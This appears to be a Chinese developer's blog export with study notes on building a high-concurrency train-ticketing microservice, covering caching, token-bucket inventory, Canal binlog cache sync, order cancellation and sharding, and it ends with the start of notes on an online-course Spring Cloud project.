<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219145628289.png" alt="image-20241219145628289"></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219150031066.png" alt="image-20241219150031066"></p>
<p>缓存不存在时查的数据库：<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219145739028.png" alt="image-20241219145739028"></p>
<p>查询票数时的过程更复杂，缓存不存在时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">seatMarginCacheLoader.load(String.valueOf(each.getTrainId()), seatType, item.getDeparture(), item.getArrival());</span><br></pre></td></tr></table></figure>

<p>进行加载</p>
<p><strong>构建列车返回数据</strong></p>
<p>返回数据例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;code&quot;: &quot;0&quot;,</span><br><span class="line">    &quot;message&quot;: null,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;trainList&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;trainId&quot;: &quot;1&quot;,</span><br><span class="line">                &quot;trainNumber&quot;: &quot;G35&quot;,</span><br><span class="line">                &quot;departureTime&quot;: &quot;09:56&quot;,</span><br><span class="line">                &quot;arrivalTime&quot;: &quot;14:26&quot;,</span><br><span class="line">                &quot;duration&quot;: &quot;04:30&quot;,</span><br><span class="line">                &quot;daysArrived&quot;: 0,</span><br><span class="line">                &quot;departure&quot;: &quot;北京南&quot;,</span><br><span class="line">                &quot;arrival&quot;: &quot;杭州东&quot;,</span><br><span class="line">                &quot;departureFlag&quot;: true,</span><br><span class="line">                &quot;arrivalFlag&quot;: false,</span><br><span class="line">                &quot;trainType&quot;: 0,</span><br><span class="line">                &quot;saleTime&quot;: &quot;05-15 14:30&quot;,</span><br><span class="line">                &quot;saleStatus&quot;: 0,</span><br><span class="line">                &quot;trainTags&quot;: [</span><br><span class="line">                    &quot;0&quot;,</span><br><span class="line">                    &quot;1&quot;,</span><br><span class="line">                    &quot;2&quot;</span><br><span class="line">                ],</span><br><span class="line">                &quot;trainBrand&quot;: &quot;0,6&quot;,</span><br><span class="line">                &quot;seatClassList&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 0,</span><br><span class="line">                        &quot;quantity&quot;: 9,</span><br><span class="line">                        &quot;price&quot;: 2313.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 1,</span><br><span class="line">                        &quot;quantity&quot;: 139,</span><br><span class="line">                        &quot;price&quot;: 1077.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 2,</span><br><span class="line">                        &quot;quantity&quot;: 810,</span><br><span class="line">                        &quot;price&quot;: 674.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;trainId&quot;: &quot;4&quot;,</span><br><span class="line">                &quot;trainNumber&quot;: &quot;Z284&quot;,</span><br><span class="line">                &quot;departureTime&quot;: &quot;18:56&quot;,</span><br><span class="line">                &quot;arrivalTime&quot;: &quot;18:56&quot;,</span><br><span class="line">                &quot;duration&quot;: &quot;00:00&quot;,</span><br><span class="line">                &quot;daysArrived&quot;: 0,</span><br><span class="line">                &quot;departure&quot;: &quot;北京南&quot;,</span><br><span class="line">                &quot;arrival&quot;: &quot;杭州东&quot;,</span><br><span class="line">                &quot;departureFlag&quot;: true,</span><br><span class="line">                &quot;arrivalFlag&quot;: true,</span><br><span class="line">                &quot;trainType&quot;: 2,</span><br><span class="line">                &quot;saleTime&quot;: &quot;05-15 14:30&quot;,</span><br><span class="line">                &quot;saleStatus&quot;: 0,</span><br><span class="line">                &quot;trainTags&quot;: [</span><br><span class="line">                    &quot;0&quot;</span><br><span class="line">                ],</span><br><span class="line">                &quot;trainBrand&quot;: &quot;6&quot;,</span><br><span class="line">                &quot;seatClassList&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 6,</span><br><span class="line">                        &quot;quantity&quot;: 0,</span><br><span class="line">                        &quot;price&quot;: 328.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 7,</span><br><span class="line">                        &quot;quantity&quot;: 0,</span><br><span class="line">                        &quot;price&quot;: 62.2,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 8,</span><br><span class="line">                        &quot;quantity&quot;: 0,</span><br><span class="line">                        &quot;price&quot;: 529.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 13,</span><br><span class="line">                        &quot;quantity&quot;: 0,</span><br><span class="line">                        &quot;price&quot;: 328.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;trainId&quot;: &quot;2&quot;,</span><br><span class="line">                &quot;trainNumber&quot;: &quot;G39&quot;,</span><br><span class="line">                &quot;departureTime&quot;: &quot;19:04&quot;,</span><br><span class="line">                &quot;arrivalTime&quot;: &quot;23:22&quot;,</span><br><span class="line">                &quot;duration&quot;: &quot;04:18&quot;,</span><br><span class="line">                &quot;daysArrived&quot;: 0,</span><br><span class="line">                &quot;departure&quot;: &quot;北京南&quot;,</span><br><span class="line">                &quot;arrival&quot;: &quot;杭州东&quot;,</span><br><span class="line">                &quot;departureFlag&quot;: true,</span><br><span class="line">                &quot;arrivalFlag&quot;: true,</span><br><span class="line">                &quot;trainType&quot;: 0,</span><br><span class="line">                &quot;saleTime&quot;: &quot;05-15 14:30&quot;,</span><br><span class="line">                &quot;saleStatus&quot;: 0,</span><br><span class="line">                &quot;trainTags&quot;: [</span><br><span class="line">                    &quot;0&quot;,</span><br><span class="line">                    &quot;3&quot;</span><br><span class="line">                ],</span><br><span class="line">                &quot;trainBrand&quot;: &quot;1,6&quot;,</span><br><span class="line">                &quot;seatClassList&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 0,</span><br><span class="line">                        &quot;quantity&quot;: 10,</span><br><span class="line">                        &quot;price&quot;: 2313.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 1,</span><br><span class="line">                        &quot;quantity&quot;: 140,</span><br><span class="line">                        &quot;price&quot;: 1064.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 2,</span><br><span class="line">                        &quot;quantity&quot;: 810,</span><br><span class="line">                        &quot;price&quot;: 663.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;trainId&quot;: &quot;3&quot;,</span><br><span class="line">                &quot;trainNumber&quot;: &quot;D717&quot;,</span><br><span class="line">                &quot;departureTime&quot;: &quot;19:16&quot;,</span><br><span class="line">                &quot;arrivalTime&quot;: &quot;09:00&quot;,</span><br><span class="line">                &quot;duration&quot;: &quot;13:44&quot;,</span><br><span class="line">                &quot;daysArrived&quot;: 0,</span><br><span class="line">                &quot;departure&quot;: &quot;北京&quot;,</span><br><span class="line">                &quot;arrival&quot;: &quot;杭州&quot;,</span><br><span class="line">                &quot;departureFlag&quot;: true,</span><br><span class="line">                &quot;arrivalFlag&quot;: true,</span><br><span class="line">                &quot;trainType&quot;: 1,</span><br><span class="line">                &quot;saleTime&quot;: &quot;05-15 14:30&quot;,</span><br><span class="line">                &quot;saleStatus&quot;: 0,</span><br><span class="line">                &quot;trainTags&quot;: [</span><br><span class="line">                    &quot;0&quot;</span><br><span class="line">                ],</span><br><span class="line">                &quot;trainBrand&quot;: &quot;6&quot;,</span><br><span class="line">                &quot;seatClassList&quot;: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 3,</span><br><span class="line">                        &quot;quantity&quot;: 92,</span><br><span class="line">                        &quot;price&quot;: 328.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 4,</span><br><span class="line">                        &quot;quantity&quot;: 192,</span><br><span class="line">                        &quot;price&quot;: 622.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 5,</span><br><span class="line">                        &quot;quantity&quot;: 216,</span><br><span class="line">                        &quot;price&quot;: 529.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        &quot;type&quot;: 13,</span><br><span class="line">                        &quot;quantity&quot;: 0,</span><br><span class="line">                        &quot;price&quot;: 328.0,</span><br><span class="line">                        &quot;candidate&quot;: false</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;trainBrandList&quot;: [</span><br><span class="line">            0,</span><br><span class="line">            1,</span><br><span class="line">            6</span><br><span class="line">        ],</span><br><span class="line">        &quot;departureStationList&quot;: [</span><br><span class="line">            &quot;北京南&quot;,</span><br><span class="line">            &quot;北京&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;arrivalStationList&quot;: [</span><br><span class="line">            &quot;杭州东&quot;,</span><br><span class="line">            &quot;杭州&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;seatClassTypeList&quot;: [</span><br><span class="line">            0,</span><br><span class="line">            1,</span><br><span class="line">            2,</span><br><span class="line">            3,</span><br><span class="line">            4,</span><br><span class="line">            5,</span><br><span class="line">            6,</span><br><span class="line">            7,</span><br><span class="line">            8,</span><br><span class="line">            13</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;requestId&quot;: null,</span><br><span class="line">    &quot;success&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="海量并发下单接口，如何应对海量用户下单请求，如何进行限流以保证系统不崩溃？以及如何正确落库？"><a href="#海量并发下单接口，如何应对海量用户下单请求，如何进行限流以保证系统不崩溃？以及如何正确落库？" class="headerlink" title="海量并发下单接口，如何应对海量用户下单请求，如何进行限流以保证系统不崩溃？以及如何正确落库？"></a>海量并发下单接口，如何应对海量用户下单请求，如何进行限流以保证系统不崩溃？以及如何正确落库？</h3><p><a href="https://www.yuque.com/magestack/12306/nmmgqkgbfxb2bwl0">手摸手之实现列车购票流程</a></p>
<p><a href="https://www.yuque.com/magestack/12306/ov3u6lpgartx0mst">手摸手之实现v2版本列车购票流程</a></p>
<p><a href="https://www.yuque.com/magestack/12306/gdqnbhp10xx9g9kv">高并发库存扣减为什么需要令牌限流？</a></p>
<p>v1版本：</p>
<p><strong>防重复提交</strong>（幂等）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Idempotent(</span></span><br><span class="line"><span class="meta">        uniqueKeyPrefix = &quot;index12306-ticket:lock_purchase-tickets:&quot;,</span></span><br><span class="line"><span class="meta">        key = &quot;T(org.opengoofy.index12306.framework.starter.bases.ApplicationContextHolder).getBean(&#x27;environment&#x27;).getProperty(&#x27;unique-name&#x27;, &#x27;&#x27;)&quot;</span></span><br><span class="line"><span class="meta">                + &quot;+&#x27;_&#x27;+&quot;</span></span><br><span class="line"><span class="meta">                + &quot;T(org.opengoofy.index12306.frameworks.starter.user.core.UserContext).getUsername()&quot;,</span></span><br><span class="line"><span class="meta">        message = &quot;正在执行下单流程，请稍后...&quot;,</span></span><br><span class="line"><span class="meta">        scene = IdempotentSceneEnum.RESTAPI,</span></span><br><span class="line"><span class="meta">        type = IdempotentTypeEnum.SPEL</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/api/ticket-service/ticket/purchase&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result&lt;TicketPurchaseRespDTO&gt; <span class="title function_">purchaseTickets</span><span class="params">(<span class="meta">@RequestBody</span> PurchaseTicketReqDTO requestParam)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Results.success(ticketService.purchaseTicketsV1(requestParam));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>验证提交参数</strong>：责任链验证</p>
<p><strong>避免分配相同座位</strong>：我们通过 Redisson 分布式锁来解决这个问题。同一列车在同一时间下仅有单个用户可以进行座位分配以及创建订单行为，再加上 Redisson 分布式锁的自动续期等功能，可以很好保障系统运行稳定和脏数据问题</p>
<p><strong>座位分配</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● 如果购票人数为两人，购买同一车厢，座位优先检索两人相邻座位并排分配。</span><br><span class="line">● 假设当前正在检索的车厢不满足两人并排，就执行搜索全部满足两人并排的车厢。</span><br><span class="line">● 如果搜索了所有车厢还是没有两人并排做的座位，那么执行同车厢不相邻座位。</span><br><span class="line">● 如果所有车厢都是仅有一个座位，就开始执行最后降级操作，不同车厢分配</span><br></pre></td></tr></table></figure>

<p><strong>订单创建</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、订单号生成https://www.yuque.com/magestack/12306/dyr1d4r3me19gg7l#wECos 基因法</span><br><span class="line">2、创建订单记录 有三类订单数据，分别是：主订单表、订单明细表以及订单乘车人明细表</span><br><span class="line">3、延迟关闭订单</span><br></pre></td></tr></table></figure>



<p>v2版本：余票缓存做余票数量展示和限流效果 &#x3D;》 构建库存令牌容器，拆分开限流和库存</p>
<p><strong>扣减令牌容器后，对余票缓存并没有影响，只有在修改了座位表后，才会通过 Canal 形式监听并减少余票缓存。</strong></p>
<p>将没有出售的座位当作一个个令牌放到一个容器中。如果用户来购票，根据所选择的乘车人数量以及座位类型去令牌容器中获取，获取成功则表示余票充足，可以进入接下来的选票以及下单流程，获取失败则直接返回</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219155416279.png" alt="image-20241219155416279"></p>
<p>以 G35 复兴号高铁列车距离，购买北京南到南京南，需要扣减的站点如下所示（也就是所有有交集的站都要扣减）</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219155641152.png" alt="image-20241219155641152"></p>
<p>如果有令牌容器，发现没有剩余可用令牌，那么我们可以进行兜底判断，也可以叫做二次检查。触发一个请求去比对数据库是否还有值，如果有的话，那么就把令牌容器缓存删除，下个用户再购票时，重新加载即可。</p>
<p>这个相当于是一个标志位，本地缓存这个标志位表示10分钟内有人刷新过令牌桶了，后续请求就不需要刷新了。用本地缓存的话能够快速判断吧，限制单节点请求，用分布式锁的话限制的是全局刷新请求，没啥必要，毕竟就是个刷新令牌桶的操作。<br>另外，分节点刷新的话实际刷新的频率应该比10分钟要短一些，毕竟每个节点触发刷新的操作互相不影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (tokenResult.getTokenIsNull()) &#123;</span><br><span class="line">    Object ifPresentObj = tokenTicketsRefreshMap.getIfPresent(requestParam.getTrainId());</span><br><span class="line">    if (ifPresentObj == null) &#123;</span><br><span class="line">        synchronized (TicketService.class) &#123;</span><br><span class="line">            if (tokenTicketsRefreshMap.getIfPresent(requestParam.getTrainId()) == null) &#123;</span><br><span class="line">                ifPresentObj = new Object();</span><br><span class="line">                tokenTicketsRefreshMap.put(requestParam.getTrainId(), ifPresentObj);</span><br><span class="line">                tokenIsNullRefreshToken(requestParam, tokenResult);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    throw new ServiceException(&quot;列车站点已无余票&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tokenIsNullRefreshToken 会延迟十秒进行更新</p>
<h3 id="用户下单后如何保障列车座位余票缓存和数据库一致性？非常典型的数据库和缓存一致性问题。"><a href="#用户下单后如何保障列车座位余票缓存和数据库一致性？非常典型的数据库和缓存一致性问题。" class="headerlink" title="用户下单后如何保障列车座位余票缓存和数据库一致性？非常典型的数据库和缓存一致性问题。"></a>用户下单后如何保障列车座位余票缓存和数据库一致性？非常典型的数据库和缓存一致性问题。</h3><p><a href="https://blog.csdn.net/weixin_44911081/article/details/122582024">Canal安装与配置（保姆级教程）_canal 配置-CSDN博客</a></p>
<p><a href="https://www.yuque.com/magestack/12306/glv5e0785b2d7oag">手摸手之列车余票如何保障缓存数据库一致性</a></p>
<p><a href="https://www.cnblogs.com/ScarecrowAnBird/p/18163444">MySQL三大日志(binlog,redolog,undolog)详解 - 落叶已归根 - 博客园</a></p>
<p>方案：通过 Binlog 异步更新列车缓存</p>
<p>步骤： MySQL , 需要先开启 Binlog 写入功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin # 开启 binlog</span><br><span class="line">binlog-format=ROW # 选择 ROW 模式</span><br><span class="line">server_id=1 # 配置 MySQL replaction 需要定义，不要和 canal 的 slaveId 重复</span><br></pre></td></tr></table></figure>

<p>配置修改成功后，重启一下 MySQL，确保所有的配置生效。然后执行 MySQL 执行命令查看是否修改 Binlog 成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看 binlog 日志是否开启</span><br><span class="line">show variables like &#x27;log_%&#x27;;</span><br></pre></td></tr></table></figure>

<p>最后，MySQL 执行 SQL 语句创建 canal 单独使用的账号，用来进行 Binlog 的同步和监听。</p>
<p>接下来开始配置 Canal 中间件，下载 Canal 安装包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将 instance.properties 配置文件中的 canal.instance.master.address 配置项替换为真实的 MySQL 地址和端口</span><br><span class="line">instance.properties 配置文件中的 canal.mq.topic 也需要变更，配置中默认为 index12306_canal_ticket-service_common-sync_topic-mading</span><br></pre></td></tr></table></figure>

<p>mq消息例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;data&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;:&quot;1684913289981231104&quot;,</span><br><span class="line">            &quot;train_id&quot;:&quot;1&quot;,</span><br><span class="line">            &quot;carriage_number&quot;:&quot;01&quot;,</span><br><span class="line">            &quot;seat_number&quot;:&quot;02C&quot;,</span><br><span class="line">            &quot;seat_type&quot;:&quot;0&quot;,</span><br><span class="line">            &quot;start_station&quot;:&quot;北京南&quot;,</span><br><span class="line">            &quot;end_station&quot;:&quot;南京南&quot;,</span><br><span class="line">            &quot;price&quot;:&quot;186400&quot;,</span><br><span class="line">            &quot;seat_status&quot;:&quot;1&quot;,</span><br><span class="line">            &quot;create_time&quot;:&quot;2023-07-28 21:06:47&quot;,</span><br><span class="line">            &quot;update_time&quot;:&quot;2023-08-17 15:41:00&quot;,</span><br><span class="line">            &quot;del_flag&quot;:&quot;0&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;database&quot;:&quot;12306&quot;,</span><br><span class="line">    &quot;es&quot;:1692516745000,</span><br><span class="line">    &quot;id&quot;:2,</span><br><span class="line">    &quot;isDdl&quot;:false,</span><br><span class="line">    &quot;mysqlType&quot;:&#123;</span><br><span class="line">        &quot;id&quot;:&quot;bigint(20) unsigned&quot;,</span><br><span class="line">        &quot;train_id&quot;:&quot;bigint(20)&quot;,</span><br><span class="line">        &quot;carriage_number&quot;:&quot;varchar(64)&quot;,</span><br><span class="line">        &quot;seat_number&quot;:&quot;varchar(64)&quot;,</span><br><span class="line">        &quot;seat_type&quot;:&quot;int(3)&quot;,</span><br><span class="line">        &quot;start_station&quot;:&quot;varchar(256)&quot;,</span><br><span class="line">        &quot;end_station&quot;:&quot;varchar(256)&quot;,</span><br><span class="line">        &quot;price&quot;:&quot;int(11)&quot;,</span><br><span class="line">        &quot;seat_status&quot;:&quot;int(3)&quot;,</span><br><span class="line">        &quot;create_time&quot;:&quot;datetime&quot;,</span><br><span class="line">        &quot;update_time&quot;:&quot;datetime&quot;,</span><br><span class="line">        &quot;del_flag&quot;:&quot;tinyint(1)&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;old&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;seat_status&quot;:&quot;0&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;pkNames&quot;:[</span><br><span class="line">        &quot;id&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;sql&quot;:&quot;&quot;,</span><br><span class="line">    &quot;sqlType&quot;:&#123;</span><br><span class="line">        &quot;id&quot;:-5,</span><br><span class="line">        &quot;train_id&quot;:-5,</span><br><span class="line">        &quot;carriage_number&quot;:12,</span><br><span class="line">        &quot;seat_number&quot;:12,</span><br><span class="line">        &quot;seat_type&quot;:4,</span><br><span class="line">        &quot;start_station&quot;:12,</span><br><span class="line">        &quot;end_station&quot;:12,</span><br><span class="line">        &quot;price&quot;:4,</span><br><span class="line">        &quot;seat_status&quot;:4,</span><br><span class="line">        &quot;create_time&quot;:93,</span><br><span class="line">        &quot;update_time&quot;:93,</span><br><span class="line">        &quot;del_flag&quot;:-6</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;table&quot;:&quot;t_seat&quot;,</span><br><span class="line">    &quot;ts&quot;:1692516746008,</span><br><span class="line">    &quot;type&quot;:&quot;UPDATE&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>监听了order和seat表</p>
<p>order status字段部分意思</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 待支付：用户选好车票下单，但还未付款的状态</span><br><span class="line"> */</span><br><span class="line">PENDING_PAYMENT(0),</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 已支付：用户支付订单费用</span><br><span class="line"> */</span><br><span class="line">ALREADY_PAID(10),</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 部分退款：用户支付订单费用后部分车票退款</span><br><span class="line"> */</span><br><span class="line">PARTIAL_REFUND(11),</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 全部退款：用户支付订单费用后全部车票退款</span><br><span class="line"> */</span><br><span class="line">FULL_REFUND(12),</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 已完成：用户车票已过上站时间，订单完成</span><br><span class="line"> */</span><br><span class="line">COMPLETED(20),</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 已取消：用户选好车票下单，未支付状态下取消订单</span><br><span class="line"> */</span><br><span class="line">CLOSED(30);</span><br></pre></td></tr></table></figure>



<h3 id="用户下单十分钟未支付，如何取消用户未付款订单？如果用户已支付，如何避免错误取消？"><a href="#用户下单十分钟未支付，如何取消用户未付款订单？如果用户已支付，如何避免错误取消？" class="headerlink" title="用户下单十分钟未支付，如何取消用户未付款订单？如果用户已支付，如何避免错误取消？"></a>用户下单十分钟未支付，如何取消用户未付款订单？如果用户已支付，如何避免错误取消？</h3><p><a href="https://blog.csdn.net/weixin_42740530/article/details/114088194">rocketmq-console可视化界面如何查看消息积压，消息是否消费_rocketmq查看消息堆积个数-CSDN博客</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241219192450687.png" alt="image-20241219192450687"></p>
<p>订单取消前进行了状态判断，如果是非待支付的状态直接返回 false，就不会进行下面的流程。</p>
<h3 id="系统中用了消息队列后，如何确保消息不会被重复消费，保证业务系统消费幂等性？"><a href="#系统中用了消息队列后，如何确保消息不会被重复消费，保证业务系统消费幂等性？" class="headerlink" title="系统中用了消息队列后，如何确保消息不会被重复消费，保证业务系统消费幂等性？"></a>系统中用了消息队列后，如何确保消息不会被重复消费，保证业务系统消费幂等性？</h3><p>幂等注解</p>
<h3 id="海量用户和订单数据如何存储，通过什么分库分表规则保障系统高性能响应用户查询等请求？"><a href="#海量用户和订单数据如何存储，通过什么分库分表规则保障系统高性能响应用户查询等请求？" class="headerlink" title="海量用户和订单数据如何存储，通过什么分库分表规则保障系统高性能响应用户查询等请求？"></a>海量用户和订单数据如何存储，通过什么分库分表规则保障系统高性能响应用户查询等请求？</h3><p>用户根据username分表</p>
<p>订单基因法使用用户ID后四位进行分表</p>
<h3 id="如何通过分库分表基因算法保障分片键的易用性？比如一个订单号字段同时支持订单号和用户-ID-查询。"><a href="#如何通过分库分表基因算法保障分片键的易用性？比如一个订单号字段同时支持订单号和用户-ID-查询。" class="headerlink" title="如何通过分库分表基因算法保障分片键的易用性？比如一个订单号字段同时支持订单号和用户 ID 查询。"></a>如何通过分库分表基因算法保障分片键的易用性？比如一个订单号字段同时支持订单号和用户 ID 查询。</h3><p><a href="https://www.yuque.com/magestack/12306/dyr1d4r3me19gg7l">手摸手之订单如何分库分表 · 语雀</a></p>
<h3 id="海量数据分库分表后，为什么选择雪花算法作为-ID？如何保障雪花算法在大规模集群下生成不重复？"><a href="#海量数据分库分表后，为什么选择雪花算法作为-ID？如何保障雪花算法在大规模集群下生成不重复？" class="headerlink" title="海量数据分库分表后，为什么选择雪花算法作为 ID？如何保障雪花算法在大规模集群下生成不重复？"></a>海量数据分库分表后，为什么选择雪花算法作为 ID？如何保障雪花算法在大规模集群下生成不重复？</h3><p><a href="https://www.yuque.com/magestack/12306/lc2yb8gxtvfdt7rp">手摸手实现分布式ID组件库</a></p>
<h3 id="redis单片热key处理方法"><a href="#redis单片热key处理方法" class="headerlink" title="redis单片热key处理方法"></a>redis单片热key处理方法</h3><p><a href="https://blog.csdn.net/weixin_45433817/article/details/130814075">5种Redis热key问题解决方案_redis热key解决方案-CSDN博客</a></p>
<h3 id="sentinel限流原理"><a href="#sentinel限流原理" class="headerlink" title="sentinel限流原理"></a>sentinel限流原理</h3><h3 id="3W字吃透：微服务-sentinel-限流-底层原理和实操-sentinel学习圣经-CSDN博客"><a href="#3W字吃透：微服务-sentinel-限流-底层原理和实操-sentinel学习圣经-CSDN博客" class="headerlink" title="3W字吃透：微服务 sentinel 限流 底层原理和实操_sentinel学习圣经-CSDN博客"></a><a href="https://blog.csdn.net/crazymakercircle/article/details/130556777">3W字吃透：微服务 sentinel 限流 底层原理和实操_sentinel学习圣经-CSDN博客</a></h3>]]></content>
      <tags>
        <tag>java</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>project_学成在线</title>
    <url>/2024/09/22/project-%E5%AD%A6%E6%88%90%E5%9C%A8%E7%BA%BF/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1j8411N7Bm/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Java项目企业级微服务实战《学成在线》，基于SpringCloud、SpringCloudAlibaba技术栈开发，项目搭建到选课支付学习全通关_哔哩哔哩_bilibili</a></p>
<span id="more"></span>

<h1 id="项目介绍-amp-环境搭建"><a href="#项目介绍-amp-环境搭建" class="headerlink" title="项目介绍&amp;环境搭建"></a>项目介绍&amp;环境搭建</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本项目采用前后端分离架构，后端采用SpringBoot、SpringCloud技术栈开发，数据库使用了MySQL，还使用的Redis、消息队列、分布式文件系统、Elasticsearch等中间件系统。</p>
<p>划分的微服务包括：内容管理服务、媒资管理服务、搜索服务、订单支付服务、 学习中心服务、系统管理服务、认证授权服务、网关服务、注册中心服务、配置中心服务等。</p>
<p> 学习项目自己开发了内容管理、媒资管理、订单支付模块 </p>
<h2 id="开发工具列表"><a href="#开发工具列表" class="headerlink" title="开发工具列表"></a>开发工具列表</h2><p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240922144652790.png" alt="image-20240922144652790"></p>
<h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip:192.168.101.65</span><br><span class="line">mysql:root mysql</span><br><span class="line">centos:root centos</span><br></pre></td></tr></table></figure>

<p>视频教程是用gos存代码，但我还是想用git或gitee，好看commit记录</p>
<p>设置.gitignore文件:对应commit:<a href="https://github.com/realikun404/xuecheng-plus-project/blob/264862be73df111e9ada4816167d621d633686ce/.idea/.gitignore">xuecheng-plus-project&#x2F;.idea&#x2F;.gitignore at 264862be73df111e9ada4816167d621d633686ce · realikun404&#x2F;xuecheng-plus-project (github.com)</a>、<a href="https://github.com/realikun404/xuecheng-plus-project/commit/7b34e9b4c9ab3da49dc79ba42392801c54c90357">add ignore · realikun404&#x2F;xuecheng-plus-project@7b34e9b (github.com)</a></p>
<h2 id="基础工程创建"><a href="#基础工程创建" class="headerlink" title="基础工程创建"></a>基础工程创建</h2><p>整个项目分为三大类工程：父工程、基础工程 和微服务工程。</p>
